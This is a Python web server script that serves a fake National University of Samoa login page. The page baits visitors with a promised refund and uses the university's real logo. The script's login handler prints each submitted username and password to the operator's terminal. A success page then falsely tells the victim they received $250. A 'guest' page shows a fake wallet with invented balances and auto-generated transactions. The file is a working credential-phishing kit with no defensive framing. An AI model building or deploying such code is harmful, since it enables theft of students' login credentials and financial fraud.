#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse as urlparse
import html, sys
import os

PORT = 9090

PAGE = r"""
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>National University of Samoa</title>
<style>
body {
  margin: 0;
  background: #6fb1ee;
  font-family: Arial, Helvetica, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}
.container {
  background: #fff;
  padding: 30px;
  border-radius: 8px;
  box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
  width: 100%;
  max-width: 420px;
  text-align: center;
}
.logo {
  width: 120px;
  height: auto;
  margin-bottom: 20px;
}
.input {
  width: 94%;
  padding: 12px;
  margin: 15px 0;
  border: 1px solid #ccc;
  border-radius: 5px;
  font-size: 15px;
}
.btn {
  width: 100%;
  padding: 12px;
  background: #3498db;
  color: #fff;
  border: none;
  border-radius: 5px;
  font-size: 16px;
  cursor: pointer;
}
.btn:hover {
  background: #2980b9;
}
.footer {
  text-align: center;
  margin-top: 15px;
  color: #555;
}
.footer button {
  margin: 5px;
  padding: 8px 12px;
  border: none;
  border-radius: 5px;
  background: #2ecc71;
  color: white;
  cursor: pointer;
}
.footer button:hover {
  background: #27ae60;
}
</style>
</head>
<body>

<div class="container">
  <img class="logo" src="https://nus.edu.ws/wp-content/uploads/2020/03/cropped-Logo-1.png" alt="NUS Logo">
  <h2>National University of Samoa</h2>
  <form method="POST" action="/login" onsubmit="return validateForm()">
    <input type="text" name="username" id="username" class="input" placeholder="Username" required>
    <input type="password" name="password" id="password" class="input" placeholder="Password" required>
    <button type="submit" class="btn">Log in</button>
  </form>
  <div class="footer">
    <p>Login to receive your refund </p>
    <button onclick="location.href='/guest'">Log in as guest</button>
    <button onclick="alert('Cookies notice: This is a school site.')">Cookies notice</button>
    
  </div>
</div>

<script>
function validateForm(){
  const email = document.getElementById("email").value;
  if(email.indexOf("@") === -1 || password.indexOf(".") === -1){
    alert("Please enter a valid email.");
    return false;
  }
  return true;
}
</script>

</body>
</html>
"""

SUCCESS_PAGE = """
<!doctype html>
<html><head><meta charset="utf-8"/><title>Welcome</title>
<style>body{font-family:Arial,Helvetica,sans-serif;background:#f2f7fb;color:#222;padding:40px;text-align:center}
.box{display:inline-block;background:#fff;padding:25px;border-radius:8px;
box-shadow:0 6px 15px rgba(0,0,0,0.1);max-width:400px}
.k{font-weight:bold;color:#2980b9}</style></head>
<body>
<div class="box">
<h2>Login Successfull !</h2>
<h2>You Have Receive $250.00</h2>
<p><span class="k">Username:</span> {username}</p>
<p><span class="k">Password:</span> {password}</p>
<p style="font-size:13px;color:#555">Password was stored for safety.</p>
<a href="/">Back to Login</a>
</div></body></html>
"""

GUEST_PAGE = """
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>NUS Guest Mobile Wallet — Demo (No Auth)</title>
<style>
:root{
  --blue:#1D4ED8;
  --green:#10B981;
  --white:#ffffff;
  --muted:#6B7280;
  --bg:#F3F4F6;
  --panel-radius:16px;
  --shadow:0 6px 30px rgba(2,6,23,0.08);
  --font: "Segoe UI", Roboto, system-ui, -apple-system, sans-serif;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{
  font-family:var(--font);
  background:var(--bg);
  color:#0f1724;
  -webkit-font-smoothing:antialiased;
  -moz-osx-font-smoothing:grayscale;
  display:flex;
  justify-content:center;
  padding:12px;
}

/* Mobile frame */
.app{
  width:100%;
  max-width:460px;
  height:100vh;
  background:linear-gradient(180deg,#ffffff,#f7fafc);
  border-radius:18px;
  box-shadow:var(--shadow);
  display:flex;
  flex-direction:column;
  overflow:hidden;
}

/* Top header */
.header{
  padding:16px 18px;
  background:linear-gradient(90deg,var(--blue),#2563eb);
  color:var(--white);
  display:flex;
  align-items:center;
  justify-content:space-between;
}
.header .title{font-weight:700;font-size:18px}
.header .subtitle{font-size:12px;opacity:0.95}

/* Content area */
.content{
  padding:14px;
  display:flex;
  flex-direction:column;
  gap:12px;
  height:calc(100vh - 128px);
  overflow:hidden;
}

/* Top cards */
.cards{
  display:flex;
  flex-direction:column;
  gap:12px;
}
.card{
  background:var(--white);
  border-radius:14px;
  padding:14px;
  box-shadow:var(--shadow);
  transition:transform .25s ease;
}
.card:hover{transform:translateY(-4px)}
.card .row{display:flex;justify-content:space-between;align-items:center}
.card .label{font-size:13px;color:var(--muted)}
.card .balance{font-weight:800;font-size:24px;color:var(--blue);transition:all .4s cubic-bezier(.2,.9,.2,1)}

/* Quick actions */
.actions{display:flex;gap:10px;margin-top:10px}
.btn{
  flex:1;padding:10px;border-radius:12px;border:none;font-weight:700;cursor:pointer;
  display:inline-flex;align-items:center;justify-content:center;
}
.btn.primary{background:var(--blue);color:var(--white)}
.btn.secondary{background:var(--green);color:var(--white)}
.btn.ghost{background:transparent;border:1px solid rgba(15,23,36,0.06);color:var(--muted)}

/* Transactions feed */
.feed{
  flex:1;
  overflow:auto;
  padding-right:6px;
}
.section-title{font-size:13px;color:var(--muted);margin:6px 4px}
.tx{
  background:var(--white);
  border-radius:12px;
  padding:10px;
  display:flex;
  justify-content:space-between;
  align-items:center;
  gap:12px;
  margin-bottom:10px;
  box-shadow:0 8px 18px rgba(2,6,23,0.04);
  transition:transform .18s ease;
}
.tx:hover{transform:translateX(6px)}
.tx .meta{font-size:13px;color:#0f1724;font-weight:700}
.tx .sub{font-size:12px;color:var(--muted)}
.tx .amount{font-weight:800;color:var(--blue)}

/* Bottom nav */
.bottom{
  padding:12px;
  background:transparent;
  border-top:1px solid rgba(2,6,23,0.04);
  display:flex;
  gap:6px;
}
.nav-btn{
  flex:1;padding:10px;border-radius:12px;border:none;background:var(--white);box-shadow:var(--shadow);font-weight:700;color:#0f1724;cursor:pointer;
}

/* Modal */
.modal-backdrop{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(2,6,23,0.45);z-index:60}
.modal{
  width:90%;max-width:420px;background:var(--white);border-radius:14px;padding:16px;box-shadow:0 24px 80px rgba(2,6,23,0.3)
}
.field{display:flex;flex-direction:column;margin-bottom:10px}
label{font-size:13px;color:var(--muted);margin-bottom:6px}
input,select,textarea{padding:10px;border-radius:10px;border:1px solid #e6e9ee;outline:none;font-size:14px}

/* small sparkline (canvas) */
.spark{width:100%;height:46px}

/* tiny helpers */
.center{text-align:center}
.muted{color:var(--muted)}
.green{color:var(--green)}
.red{color:#ef4444}
</style>
</head>
<body>
<div class="app" role="application" aria-label="NUS Guest Mobile Wallet (demo - no auth)">
  <header class="header">
    <div>
      <div class="title">NUS Guest Wallet</div>
      <div class="subtitle" id="guestSubtitle">Guest student</div>
    </div>
    <div id="guestBalanceTop" class="muted" style="font-weight:700">$1,500.00</div>
  </header>

  <main class="content" id="mainContent">
    <div class="cards">
      <div class="card" id="walletCard">
        <div class="row">
          <div>
            <div class="label">Primary Account</div>
            <div class="balance" id="primaryBalance">$1,000.00</div>
            <div class="muted" style="font-size:12px">Checking • • • • 1234</div>
          </div>
          <div style="text-align:right">
            <div class="label">Savings</div>
            <div style="font-weight:800;color:var(--green)" id="savingsSmall">$500.00</div>
            <div class="muted" style="font-size:12px">Vault • • • • 9876</div>
          </div>
        </div>

        <div style="margin-top:12px">
          <canvas id="sparkline" class="spark" aria-hidden="true"></canvas>
        </div>

        <div class="actions" style="margin-top:14px">
          <button class="btn primary" id="btnSend">Send</button>
          <button class="btn secondary" id="btnReceive">Receive</button>
          <button class="btn ghost" id="btnMore">More</button>
        </div>
      </div>
    </div>

    <div class="section-title">Recent activity</div>
    <div class="feed" id="feed"></div>
  </main>

  <footer class="bottom">
    <button class="nav-btn" id="navHome">Home</button>
    <button class="nav-btn" id="navFeed">Feed</button>
    <button class="nav-btn" id="navCard">Cards</button>
  </footer>
</div>

<!-- Transfer modal (internal) -->
<div class="modal-backdrop" id="modalBackdrop" aria-hidden="true">
  <div class="modal" role="dialog" aria-modal="true">
    <h3 id="modalTitle">Transfer</h3>
    <div class="field">
      <label>From</label>
      <select id="fromSelect">
        <option value="primary">Primary (Checking)</option>
        <option value="savings">Savings</option>
      </select>
    </div>
    <div class="field">
      <label>To</label>
      <select id="toSelect">
        <option value="savings">Savings</option>
        <option value="primary">Primary (Checking)</option>
      </select>
    </div>
    <div class="field">
      <label>Amount (USD)</label>
      <input type="number" id="modalAmount" value="50" min="1" />
    </div>
    <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:8px">
      <button class="btn ghost" id="modalCancel">Cancel</button>
      <button class="btn primary" id="modalConfirm">Send</button>
    </div>
  </div>
</div>

<script>
/*
  NUS Guest Mobile Wallet (no auth)
  - Auto-guest (no login)
  - Pre-filled transactions
  - Live fake activity generating deposits/withdrawals
  - Smooth balance animation, sparkline
  - No external libraries, single file
*/

const state = {
  guestName: 'Guest Student',
  accounts: { primary: 1000.00, savings: 500.00 },
  transactions: [],
  history: []  // balance history for sparkline
};

// utility: format money
function fmt(v){ return '$' + Number(v).toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2}); }

// animate numeric change in place
function animateNumber(el, target, duration=500){
  const start = parseFloat(el.textContent.replace(/[^0-9.-]+/g,'')) || 0;
  const diff = target - start;
  const steps = Math.min(30, Math.ceil(duration / 20));
  let i = 0;
  const t = setInterval(()=>{
    i++;
    const val = start + diff * (i/steps);
    el.textContent = fmt(val);
    if(i>=steps) clearInterval(t);
  }, duration/steps);
}

// initialize UI
function initUI(){
  document.getElementById('guestSubtitle').textContent = state.guestName;
  updateTopBalance();
  seedTransactions();
  renderFeed();
  pushHistoryPoint();
  drawSparkline();
  startLiveActivity();
}

// update combined top balance
function updateTopBalance(){
  const total = state.accounts.primary + state.accounts.savings;
  document.getElementById('guestBalanceTop').textContent = fmt(total);
  animateNumber(document.getElementById('primaryBalance'), state.accounts.primary);
  document.getElementById('savingsSmall').textContent = fmt(state.accounts.savings);
}

// push a history point
function pushHistoryPoint(){
  const total = state.accounts.primary + state.accounts.savings;
  const time = new Date();
  state.history.push({time, total});
  if(state.history.length>40) state.history.shift();
}

// draw a small sparkline on canvas
function drawSparkline(){
  const canvas = document.getElementById('sparkline');
  const ctx = canvas.getContext('2d');
  const dpr = window.devicePixelRatio || 1;
  const w = canvas.clientWidth;
  const h = canvas.clientHeight;
  canvas.width = w * dpr;
  canvas.height = h * dpr;
  ctx.scale(dpr, dpr);
  ctx.clearRect(0,0,w,h);

  const data = state.history.length ? state.history.map(p=>p.total) : [state.accounts.primary + state.accounts.savings];
  const max = Math.max(...data);
  const min = Math.min(...data);
  const pad = 6;
  const len = data.length;
  if(len<2) return;
  ctx.beginPath();
  for(let i=0;i<len;i++){
    const x = pad + (i/ (len-1)) * (w - pad*2);
    const y = pad + (1 - (data[i]-min)/(max-min || 1)) * (h - pad*2);
    if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);
  }
  ctx.strokeStyle = '#1D4ED8';
  ctx.lineWidth = 2;
  ctx.stroke();

  // fill gradient
  ctx.lineTo(w-pad, h-pad);
  ctx.lineTo(pad, h-pad);
  ctx.closePath();
  const grad = ctx.createLinearGradient(0,0,0,h);
  grad.addColorStop(0,'rgba(29,78,216,0.12)');
  grad.addColorStop(1,'rgba(16,185,129,0.02)');
  ctx.fillStyle = grad;
  ctx.fill();
}

// realistic timestamps (recent past)
function recentTime(minutesAgo){
  const d=new Date();
  d.setMinutes(d.getMinutes() - minutesAgo);
  return d;
}

// seed plausible transactions so it doesn't look empty
function seedTransactions(){
  const seeds = [
    {type:'Deposit', from:'University', to:'Primary', amount:1200, date: recentTime(60*24*4), note:'Scholarship'},
    {type:'Withdraw', from:'Primary', to:'Grocery', amount:78.45, date: recentTime(60*24*3), note:'Groceries'},
    {type:'Transfer', from:'Primary', to:'Savings', amount:200, date: recentTime(60*24*2), note:'Save for books'},
    {type:'Deposit', from:'Part-time job', to:'Primary', amount:320, date: recentTime(60*20), note:'Shift pay'},
    {type:'Withdraw', from:'Primary', to:'Transport', amount:12.50, date: recentTime(60*5), note:'Bus fare'}
  ];
  // apply seeds to state balances and transactions in chronological order
  seeds.sort((a,b)=>a.date - b.date);
  seeds.forEach(tx=>{
    applyTransaction(tx, /*recordOnly=*/false, /*noHistory=*/true);
  });
  // after seeding push a history snapshot
  pushHistoryPoint();
}

// apply a transaction to balances and store transaction
function applyTransaction(tx, recordOnly=false, noHistory=false){
  // tx.type: Deposit / Withdraw / Transfer
  if(tx.type === 'Deposit'){
    state.accounts.primary += tx.amount;
  } else if(tx.type === 'Withdraw'){
    state.accounts.primary -= tx.amount;
  } else if(tx.type === 'Transfer'){
    // if tx.from/to are Primary/Savings in seed format
    const from = (tx.from || '').toLowerCase().includes('saving') ? 'savings' : 'primary';
    const to = (tx.to || '').toLowerCase().includes('saving') ? 'savings' : 'primary';
    if(from === to) return;
    state.accounts[from] -= tx.amount;
    state.accounts[to] += tx.amount;
  }
  // record transaction item normalized
  const item = {
    id: 't_' + Math.random().toString(36).slice(2,10),
    type: tx.type,
    from: tx.from || (tx.type==='Withdraw' ? 'Primary' : 'External'),
    to: tx.to || (tx.type==='Deposit' ? 'Primary' : 'External'),
    amount: Number(tx.amount),
    date: tx.date ? new Date(tx.date) : new Date(),
    note: tx.note || ''
  };
  if(!recordOnly) state.transactions.unshift(item);
  if(!noHistory) { pushHistoryPoint(); drawSparkline(); }
  updateTopBalance();
}

// render the feed
function renderFeed(){
  const feed = document.getElementById('feed');
  feed.innerHTML = '';
  if(state.transactions.length === 0){
    const empty = document.createElement('div');
    empty.className = 'center muted';
    empty.textContent = 'No transactions yet.';
    feed.appendChild(empty);
    return;
  }
  state.transactions.slice(0,40).forEach(tx=>{
    const el = document.createElement('div');
    el.className = 'tx';
    const left = document.createElement('div');
    const meta = document.createElement('div');
    meta.className = 'meta';
    meta.textContent = tx.type + (tx.note ? ' — ' + tx.note : '');
    const sub = document.createElement('div');
    sub.className = 'sub';
    sub.textContent = tx.date.toLocaleString();
    left.appendChild(meta);
    left.appendChild(sub);

    const amt = document.createElement('div');
    amt.className = 'amount';
    // deposits shown positive, withdraw/transfer out negative
    if(tx.type === 'Deposit' || (tx.type==='Transfer' && tx.to && tx.to.toLowerCase().includes('primary')) ) {
      amt.textContent = fmt(tx.amount);
    } else {
      amt.textContent = '-' + fmt(tx.amount);
    }

    el.appendChild(left);
    el.appendChild(amt);
    // click for detail
    el.onclick = ()=> alert(tx.type + '\n' + (tx.note || '') + '\n' + tx.date.toLocaleString() + '\nAmount: ' + fmt(tx.amount));
    feed.appendChild(el);
  });
}

// modal helpers
const modalBackdrop = document.getElementById('modalBackdrop');
document.getElementById('btnSend').onclick = ()=> openModal('send');
document.getElementById('btnReceive').onclick = ()=> openModal('receive');
document.getElementById('btnMore').onclick = ()=> openModal('send');

document.getElementById('modalCancel').onclick = ()=> closeModal();
document.getElementById('modalConfirm').onclick = ()=> {
  const mode = document.getElementById('modalTitle').dataset.mode;
  const from = document.getElementById('fromSelect').value;
  const to = document.getElementById('toSelect').value;
  const amount = Number(document.getElementById('modalAmount').value) || 0;
  if(amount <= 0){ alert('Enter a valid amount'); return; }
  if(mode === 'send'){
    // treat as Transfer internal if to != External, or Withdraw if to External
    const tx = { type: (to === 'external' ? 'Withdraw' : 'Transfer'), from: from==='primary' ? 'Primary' : 'Savings', to: to === 'primary' ? 'Primary' : (to==='savings' ? 'Savings' : 'External'), amount, date: new Date(), note: ''};
    applyTransaction(tx, /*recordOnly*/false, /*noHistory*/false);
    // record displayed transaction
    renderFeed();
  } else if(mode === 'receive'){
    const tx = { type: 'Deposit', from: 'External', to: 'Primary', amount, date: new Date(), note: '' };
    applyTransaction(tx, false, false);
    renderFeed();
  }
  closeModal();
  animateBalanceFlash();
};

function openModal(mode){
  // configure modal for send/receive
  const title = document.getElementById('modalTitle');
  const fromSelect = document.getElementById('fromSelect');
  const toSelect = document.getElementById('toSelect');
  const amount = document.getElementById('modalAmount');
  if(mode === 'send'){
    title.textContent = 'Send Money';
    title.dataset.mode = 'send';
    fromSelect.value = 'primary';
    toSelect.innerHTML = '<option value="savings">Savings</option><option value="external">External (other)</option>';
    amount.value = 50;
  } else {
    title.textContent = 'Receive Money';
    title.dataset.mode = 'receive';
    fromSelect.value = 'external';
    toSelect.innerHTML = '<option value="primary">Primary (checking)</option>';
    amount.value = 50;
  }
  modalBackdrop.style.display = 'flex';
  modalBackdrop.setAttribute('aria-hidden','false');
}

function closeModal(){
  modalBackdrop.style.display = 'none';
  modalBackdrop.setAttribute('aria-hidden','true');
}

// animate a quick flash on balance card when money moves
function animateBalanceFlash(){
  const el = document.getElementById('walletCard');
  el.animate([{transform:'scale(1)'},{transform:'scale(1.02)'},{transform:'scale(1)'}],{duration:420,easing:'ease'});
}

// live fake activity generator: small random deposits/withdrawals every few seconds
let liveTimer = null;
function startLiveActivity(){
  if(liveTimer) clearInterval(liveTimer);
  liveTimer = setInterval(()=>{
    // random chance: 70% no activity, 30% small tx
    if(Math.random() < 0.35){
      const isDeposit = Math.random() > 0.5;
      const amount = Number((Math.random()*120 + 5).toFixed(2)); // 5 - 125
      const tx = isDeposit
        ? {type:'Deposit', from:'External', to:'Primary', amount, date:new Date(), note:'Auto credit'}
        : {type:'Withdraw', from:'Primary', to:'Transport', amount, date:new Date(), note:'Auto debit'};
      applyTransaction(tx, false, false);
      // keep transactions list reasonable
      if(state.transactions.length > 200) state.transactions.length = 200;
      renderFeed();
      pushHistoryPoint();
      drawSparkline();
      animateBalanceFlash();
    }
  }, 3500 + Math.random()*2500);
}

// helper to format money (without currency sign confusion)
function fmt(v){ return Number(v).toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2}); }

// initial sync
initUI();

// navigation handlers (simple)
document.getElementById('navHome').onclick = ()=> { document.querySelector('.feed').scrollTo({top:0, behavior:'smooth'}); };
document.getElementById('navFeed').onclick = ()=> { document.querySelector('.feed').scrollTo({top:9999, behavior:'smooth'}); };
document.getElementById('navCard').onclick = ()=> { document.querySelector('.content').scrollTo({top:0, behavior:'smooth'}); };

// update top combined balance every few seconds (smooth)
setInterval(()=> {
  // animate primary and top combined element
  document.getElementById('guestBalanceTop').textContent = '$' + fmt(state.accounts.primary + state.accounts.savings);
  animateNumber(document.getElementById('primaryBalance'), state.accounts.primary, 400);
  document.getElementById('savingsSmall').textContent = '$' + fmt(state.accounts.savings);
}, 2500);

// graceful stop on unload
window.addEventListener('beforeunload', ()=> { if(liveTimer) clearInterval(liveTimer); });

</script>
</body>
</html>
"""
class SimpleHandler(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()

    def do_GET(self):
        if self.path == "/" or self.path.startswith("/?"):
            self._set_headers()
            self.wfile.write(PAGE.encode())
        elif self.path.startswith("/guest"):
            self._set_headers()
            self.wfile.write(GUEST_PAGE.encode())
        else:
            self.send_error(404, "Not found")

    def do_POST(self):
        if self.path == "/login":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8")
            data = urlparse.parse_qs(body)
            username = html.escape(data.get("username", [""])[0])
            password = html.escape(data.get("password", [""])[0])
            # print to Termux (password not stored)
            print(f"[LOGIN] Username: {username} | Password: {password}")
            self._set_headers()
            self.wfile.write(SUCCESS_PAGE.format(username=username, password=password).encode())
        else:
            self.send_error(404, "Not found")

def run():
    print(f"Server running at http://127.0.0.1:{PORT}")
    print("Press CTRL+C to stop.")
    HTTPServer(("", PORT), SimpleHandler).serve_forever()

if __name__ == "__main__":
    run()
